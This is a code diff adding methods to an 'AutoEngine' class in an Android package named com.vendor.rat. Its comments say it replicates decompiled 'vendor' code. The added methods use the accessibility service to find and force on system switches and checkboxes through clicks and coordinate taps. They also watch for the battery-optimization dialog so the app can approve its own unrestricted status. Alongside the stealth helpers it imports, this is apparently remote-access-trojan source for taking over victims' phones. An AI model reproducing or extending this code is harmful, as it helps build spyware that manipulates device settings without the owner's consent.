@@ -7,12 +7,15 @@ import android.view.accessibility.AccessibilityEvent;
 import android.view.accessibility.AccessibilityNodeInfo;
 
 import com.vendor.rat.auto.condition.CombineFilter;
+import com.vendor.rat.auto.condition.StringCondition;
+import com.vendor.rat.auto.entity.CheckedResult;
 import com.vendor.rat.auto.entity.UiNode;
 import com.vendor.rat.auto.filter.NodeFilter;
 import com.vendor.rat.config.TextConfig;
 import com.vendor.rat.helper.BlockViewHelper;
 import com.vendor.rat.helper.StealthHelper;
 import com.vendor.rat.helper.StealthIntent;
+import com.vendor.rat.model.req.ListenWindow;
 import com.vendor.rat.service.MyAccessibilityService;
 
 import java.util.ArrayList;
@@ -72,7 +75,7 @@ public abstract class AutoEngine {
         }
 
         public boolean matches(String pkg, String cls, int eventType) {
-            if (!packageName.equals(pkg)) return false;
+            if (packageName != null && !packageName.equals(pkg)) return false;
             if (className != null && !className.isEmpty() && !className.equals(cls)) {
                 return false;
             }
@@ -721,5 +724,505 @@ public abstract class AutoEngine {
         } catch (Exception e) {
             logError("launchSettings error", e);
         }
+    }
+
+    // ============ Switch/CheckBox 操作 — 对齐 vendor o/c.java ============
+
+    /**
+     * CompoundButton 查找+点击+验证
+     * 对应 vendor: o/c.java P() 行 223-309
+     *
+     * 逻辑:
+     *   1. 构建 className=CompoundButton 过滤器
+     *   2. 从 target 向上遍历 parent (最多 2 层) 查找
+     *   3. 如果 checked=false: click() → T0(1)+refresh 重试最多 5 次
+     *   4. 如果仍 unchecked: findParentUtilCombine(clickableFilter) → click
+     *   5. 返回 CheckedResult
+     */
+    public static CheckedResult P(UiNode target) {
+        CheckedResult result = new CheckedResult();
+        try {
+            // vendor: className == android.widget.CompoundButton
+            NodeFilter compoundButtonFilter = com.vendor.rat.auto.condition.StringCondition
+                    .className("android.widget.CompoundButton");
+
+            // 从 target 向上遍历 parent (最多 2 层)
+            UiNode node = null;
+            UiNode current = target;
+            int depth = 0;
+            while (current != null && node == null && depth <= 2) {
+                node = current.findOneByCombine(compoundButtonFilter);
+                if (node == null) {
+                    current = current.parent();
+                }
+                depth++;
+            }
+
+            if (node == null) return result;
+
+            boolean checked = node.checked();
+            int retries = 5;
+
+            if (!checked) {
+                // 先尝试直接 click
+                if (node.click()) {
+                    result.setClicked(true);
+                    node.refresh();
+                    checked = node.checked();
+                }
+                // vendor c.java:265-271: T0(1) + refresh 循环
+                while (retries > 0 && !checked) {
+                    sleep(200); // T0(1) = 200ms
+                    node.refresh();
+                    checked = node.checked();
+                    retries--;
+                }
+            }
+
+            if (!checked) {
+                // vendor c.java:280-286: findParentUtilCombine(L()) 查找 clickable 父节点
+                UiNode clickableParent = node.findParentUtilCombine(
+                        CombineFilter.clickable());
+                if (clickableParent != null && clickableParent.click()) {
+                    result.setClicked(true);
+                    node.refresh();
+                    checked = node.checked();
+                    // 再次重试验证
+                    retries = 5;
+                    while (retries > 0 && !checked) {
+                        sleep(200);
+                        node.refresh();
+                        checked = node.checked();
+                        retries--;
+                    }
+                }
+            }
+
+            result.setChecked(checked);
+        } catch (Exception e) {
+            Log.e(TAG, "P() error", e);
+        }
+        return result;
+    }
+
+    /**
+     * Switch/CheckBox OR 查找+点击+验证
+     * 对应 vendor: o/c.java O() 行 488-559
+     *
+     * ADAPT: vendor 用 CombineFiltersWithOr 数据类, replica 用 NodeFilter varargs
+     */
+    public CheckedResult O(UiNode target) {
+        CheckedResult result = new CheckedResult();
+        try {
+            // vendor: CombineFiltersWithOr(Switch, CheckBox)
+            NodeFilter switchFilter = CombineFilter.switchWidget();
+            NodeFilter checkBoxFilter = CombineFilter.checkBox();
+
+            // 从 target 向上遍历 parent (最多 2 层)
+            UiNode node = null;
+            UiNode current = target;
+            int depth = 0;
+            while (current != null && node == null && depth <= 2) {
+                node = current.findOneByOperateOr(switchFilter, checkBoxFilter);
+                if (node == null) {
+                    current = current.parent();
+                }
+                depth++;
+            }
+
+            if (node == null) return result;
+
+            boolean checked = node.checked();
+
+            // vendor c.java:541-551: 循环 click+T0(5)+refresh (最多 5 次)
+            int tries = 0;
+            while (!checked && tries < 5) {
+                node.click();
+                result.setClicked(true);
+                sleep(1000); // T0(5) = 1s
+                node.refresh();
+                checked = node.checked();
+                tries++;
+            }
+
+            result.setChecked(checked);
+        } catch (Exception e) {
+            Log.e(TAG, "O() error", e);
+        }
+        return result;
+    }
+
+    /**
+     * Switch 坐标点击+验证 (华为特有)
+     * 对应 vendor: o/c.java R() 行 654-731
+     *
+     * 逻辑: 找 Switch → boundsInScreen.right-50 + centerInScreen.y → tapAtCoordinate
+     */
+    public CheckedResult R(UiNode target, int retries) {
+        CheckedResult result = new CheckedResult();
+        try {
+            NodeFilter switchFilter = CombineFilter.switchWidget();
+
+            // 从 target 向上遍历 parent (最多 2 层)
+            UiNode node = null;
+            UiNode current = target;
+            int depth = 0;
+            while (current != null && node == null && depth <= 2) {
+                node = current.findOneByCombine(switchFilter);
+                if (node == null) {
+                    current = current.parent();
+                }
+                depth++;
+            }
+
+            if (node == null) return result;
+
+            boolean checked = node.checked();
+            // vendor c.java:678-680: right-50, centerInScreen.y
+            android.graphics.Rect bounds = node.boundsInScreen();
+            com.vendor.rat.auto.entity.Point center = node.centerInScreen();
+            int clickX = bounds.right - 50;
+            int clickY = (int) center.getY();
+
+            if (!checked) {
+                // vendor c.java:686-690: g.s(clickX, clickY) 坐标点击
+                if (com.vendor.rat.utils.MiscUtils.tapAtCoordinate(clickX, clickY)) {
+                    result.setClicked(true);
+                    // vendor c.java:691-694: 刷新根节点 → 重新查找 → 验证
+                    activateRoot();
+                    UiNode refreshedNode = current != null ?
+                            current.findOneByCombine(switchFilter) : null;
+                    if (refreshedNode != null) {
+                        checked = refreshedNode.checked();
+                        node = refreshedNode;
+                    }
+                }
+                // vendor c.java:696-702: retry loop
+                while (retries > 0 && !checked) {
+                    sleep(200); // T0(1)
+                    if (current != null) {
+                        UiNode retryNode = current.findOneByCombine(switchFilter);
+                        if (retryNode != null) {
+                            checked = retryNode.checked();
+                            node = retryNode;
+                        }
+                    }
+                    retries--;
+                }
+            }
+
+            // vendor c.java:704-711: fallback to clickable parent
+            if (!checked) {
+                UiNode clickableParent = node.findParentUtilCombine(
+                        CombineFilter.clickable());
+                if (clickableParent != null && clickableParent.click()) {
+                    result.setClicked(true);
+                    node.refresh();
+                    checked = node.checked();
+                    int fallbackRetries = 5;
+                    while (fallbackRetries > 0 && !checked) {
+                        sleep(200);
+                        node.refresh();
+                        checked = node.checked();
+                        fallbackRetries--;
+                    }
+                }
+            }
+
+            result.setChecked(checked);
+        } catch (Exception e) {
+            Log.e(TAG, "R() error", e);
+        }
+        return result;
+    }
+
+    /**
+     * Switch 坐标点击变体 (简化版, 无 retry/fallback)
+     * 对应 vendor: o/c.java S() 行 334-382
+     *
+     * 逻辑: 找 Switch → right-80 + centerY → tapAtCoordinate → T0(5) 等待
+     */
+    public static CheckedResult S(UiNode target) {
+        CheckedResult result = new CheckedResult();
+        try {
+            NodeFilter switchFilter = CombineFilter.switchWidget();
+
+            // 从 target 向上遍历 parent (最多 2 层)
+            UiNode node = null;
+            UiNode current = target;
+            int depth = 0;
+            while (current != null && node == null && depth <= 2) {
+                node = current.findOneByCombine(switchFilter);
+                if (node == null) {
+                    current = current.parent();
+                }
+                depth++;
+            }
+
+            if (node == null) return result;
+
+            result.setChecked(node.checked());
+            // vendor c.java:358-359: right + (-80), centerInScreen.y
+            android.graphics.Rect bounds = node.boundsInScreen();
+            com.vendor.rat.auto.entity.Point center = node.centerInScreen();
+            int clickX = bounds.right - 80;
+            int clickY = (int) center.getY();
+
+            if (!result.isChecked()) {
+                if (com.vendor.rat.utils.MiscUtils.tapAtCoordinate(clickX, clickY)) {
+                    sleep(1000); // T0(5) = 1s
+                    result.setClicked(true);
+                }
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "S() error", e);
+        }
+        return result;
+    }
+
+    // ============ ListenWindow 匹配 — 对齐 vendor o/e.java ============
+
+    /**
+     * 单个 ListenWindow 匹配检查 (matchs + dismiss)
+     * 对应 vendor: o/e.java p() 行 695-719
+     *
+     * @param lw   目标 ListenWindow (含 matchs/dismiss CombineFilter 列表)
+     * @param root 当前界面根节点
+     * @return true=匹配成功 (matchs 全通过 + dismiss 全不通过)
+     */
+    protected boolean matchListenWindow(ListenWindow lw, UiNode root) {
+        try {
+            // vendor e.java:699-704: matchs 全部通过 (AND)
+            List<CombineFilter> matchs = lw.getMatchs();
+            if (matchs != null && !matchs.isEmpty() && root != null) {
+                for (CombineFilter filter : matchs) {
+                    if (root.findOneByCombine(filter) == null) {
+                        return false;
+                    }
+                }
+            }
+
+            // vendor e.java:709-713: dismiss 全部不通过 (NOT ANY)
+            List<CombineFilter> dismiss = lw.getDismiss();
+            if (dismiss != null && !dismiss.isEmpty() && root != null) {
+                for (CombineFilter filter : dismiss) {
+                    if (root.findOneByCombine(filter) != null) {
+                        return false;
+                    }
+                }
+            }
+
+            return true;
+        } catch (Exception e) {
+            Log.e(TAG, "matchListenWindow error", e);
+            return true; // vendor: 异常时默认允许
+        }
+    }
+
+    /**
+     * 批量 ListenWindow 匹配
+     * 对应 vendor: o/e.java q() 行 727-807
+     *
+     * 逻辑: 遍历列表, 用 currentPackage/currentClassName 比较 pkg/cls,
+     *        匹配后检查 matchs/dismiss, 任一匹配即返回 true
+     */
+    protected boolean matchListenWindows(java.util.List<ListenWindow> windows) {
+        if (windows == null || windows.isEmpty()) return false;
+        try {
+            // vendor e.java:735: 刷新根节点
+            UiNode root = cachedRoot.get();
+            if (root != null) root.refresh();
+
+            for (ListenWindow lw : windows) {
+                // vendor e.java:740-745: 比较 packageName
+                String lwPkg = lw.getPackageName();
+                String lwCls = lw.getClassName();
+
+                if (lwPkg != null && !lwPkg.equals(currentPackage)) {
+                    continue;
+                }
+
+                // vendor e.java:746-750: 比较 className (null = 任意)
+                if (lwCls != null && !lwCls.isEmpty() && !lwCls.equals(currentClassName)) {
+                    continue;
+                }
+
+                // vendor e.java:752-770: 检查 matchs + dismiss
+                if (matchListenWindow(lw, root != null ? root : getRootNode())) {
+                    return true;
+                }
+            }
+            return false;
+        } catch (Exception e) {
+            Log.e(TAG, "matchListenWindows error", e);
+            return false;
+        }
+    }
+
+    // ============ 电池优化对话框 — 对齐 vendor o/c.java ============
+
+    /**
+     * 构建电池优化对话框 ListenWindow
+     * 对应 vendor: o/c.java J() 行 68-72
+     */
+    public static ListenWindow buildBatteryDialogWindow() {
+        ListenWindow lw = new ListenWindow("com.android.settings", "android.app.Dialog");
+        HashSet<Integer> eventTypes = new HashSet<>();
+        eventTypes.add(32);    // TYPE_WINDOW_CONTENT_CHANGED
+        eventTypes.add(16384); // TYPE_VIEW_SCROLLED
+        lw.setEventTypes(eventTypes);
+        return lw;
+    }
+
+    /**
+     * 构建"允许"按钮过滤器 (OR: button1 | btn_positive)
+     * 对应 vendor: o/c.java I() 行 55-66
+     * ADAPT: vendor 返回 CombineFiltersWithOr, replica 返回 NodeFilter[]
+     */
+    public static NodeFilter[] buildBatteryAllowButtonFilters() {
+        // Filter1: className=Button + id=android:id/button1
+        NodeFilter filter1 = CombineFilter.and(
+                StringCondition.className("android.widget.Button"),
+                StringCondition.viewId("android:id/button1")
+        );
+        // Filter2: className=Button + id=com.android.settings:id/btn_positive
+        NodeFilter filter2 = CombineFilter.and(
+                StringCondition.className("android.widget.Button"),
+                StringCondition.viewId("com.android.settings:id/btn_positive")
+        );
+        return new NodeFilter[]{filter1, filter2};
+    }
+
+    /**
+     * 构建取消按钮过滤器
+     * 对应 vendor: o/c.java N() 行 119-123
+     */
+    public static CombineFilter buildCancelButtonFilter() {
+        return CombineFilter.and(
+                StringCondition.className("android.widget.Button"),
+                StringCondition.viewId("android:id/button1")
+        );
+    }
+
+    /**
+     * 检查并处理电池优化对话框
+     * 对应 vendor: o/c.java u() 行 762-801
+     * 在 onAccessibilityEvent 中调用
+     */
+    protected void checkBatteryOptimizationDialog() {
+        try {
+            // vendor c.java:769-776: 检查是否在电池优化对话框
+            ListenWindow dialogWindow = buildBatteryDialogWindow();
+            if (matchListenWindows(java.util.Collections.singletonList(dialogWindow))) {
+                Log.d(TAG, "已进入是否允许忽略电池优化窗口");
+                // vendor c.java:784-791: 状态机防重复
+                if (!stateQueue.contains("keepInBatteryUnRestricted")) {
+                    stateQueue.add("keepInBatteryUnRestricted");
+                    // TODO: 异步执行点击"允许"按钮
+                    // vendor: thread.l.c(new o.a(this, 0), this.c)
+                }
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "checkBatteryOptimizationDialog error", e);
+        }
+    }
+
+    /**
+     * 检查对话框 + 屏幕状态
+     * 对应 vendor: o/c.java Y() 行 437-449
+     */
+    public static boolean checkAndDismissDialog() {
+        try {
+            // vendor c.java:439: M() — 点击取消按钮
+            // vendor c.java:440-443: 检查屏幕状态
+            if (com.vendor.rat.utils.MiscUtils.isScreenOn()) {
+                return true;
+            }
+            return false;
+        } catch (Exception e) {
+            Log.e(TAG, "checkAndDismissDialog error", e);
+            return false;
+        }
+    }
+
+    // ============ 通用 CombineFilter 构建器 — 对齐 vendor o/c.java ============
+
+    /**
+     * Switch 过滤器
+     * 对应 vendor: o/c.java a0() 行 451-455
+     */
+    public static CombineFilter buildSwitchFilter() {
+        return CombineFilter.switchWidget();
+    }
+
+    /**
+     * clickable LinearLayout 过滤器
+     * 对应 vendor: o/c.java K() 行 74-80
+     */
+    public static CombineFilter buildClickableLinearLayoutFilter() {
+        return CombineFilter.and(
+                StringCondition.className("android.widget.LinearLayout"),
+                new com.vendor.rat.auto.condition.BoolCondition(
+                        com.vendor.rat.auto.condition.BoolCondition.Property.CLICKABLE, true)
+        );
+    }
+
+    /**
+     * clickable 任意控件过滤器
+     * 对应 vendor: o/c.java L() 行 82-87
+     */
+    public static CombineFilter buildClickableFilter() {
+        return CombineFilter.clickable();
+    }
+
+    /**
+     * LinearLayout 过滤器 (注意: 不是 scrollable!)
+     * 对应 vendor: o/c.java U() 行 384-388
+     */
+    public static CombineFilter buildLinearLayoutFilter() {
+        return CombineFilter.and(
+                StringCondition.className("android.widget.LinearLayout")
+        );
+    }
+
+    /**
+     * scrollable OR 过滤器 (RecyclerView/ListView/ScrollView/任意scrollable)
+     * 对应 vendor: o/c.java V() 行 390-429
+     * ADAPT: vendor 返回 CombineFiltersWithOr, replica 返回 NodeFilter[]
+     */
+    public static NodeFilter[] buildScrollableOrFilters() {
+        // Filter1: RecyclerView + scrollable
+        NodeFilter f1 = CombineFilter.and(
+                StringCondition.className("androidx.recyclerview.widget.RecyclerView"),
+                new com.vendor.rat.auto.condition.BoolCondition(
+                        com.vendor.rat.auto.condition.BoolCondition.Property.SCROLLABLE, true)
+        );
+        // Filter2: ListView + scrollable
+        NodeFilter f2 = CombineFilter.and(
+                StringCondition.className("android.widget.ListView"),
+                new com.vendor.rat.auto.condition.BoolCondition(
+                        com.vendor.rat.auto.condition.BoolCondition.Property.SCROLLABLE, true)
+        );
+        // Filter3: ScrollView + scrollable
+        NodeFilter f3 = CombineFilter.and(
+                StringCondition.className("android.widget.ScrollView"),
+                new com.vendor.rat.auto.condition.BoolCondition(
+                        com.vendor.rat.auto.condition.BoolCondition.Property.SCROLLABLE, true)
+        );
+        // Filter4: 任意 scrollable
+        NodeFilter f4 = CombineFilter.scrollable();
+        return new NodeFilter[]{f1, f2, f3, f4};
+    }
+
+    /**
+     * TextView + text.contains 过滤器
+     * 对应 vendor: o/c.java H(String) 行 45-53
+     */
+    public static CombineFilter buildTextViewContainsFilter(String text) {
+        if (text == null || text.isEmpty()) return null;
+        return CombineFilter.and(
+                StringCondition.className("android.widget.TextView"),
+                StringCondition.textContains(text)
+        );
     }
 }
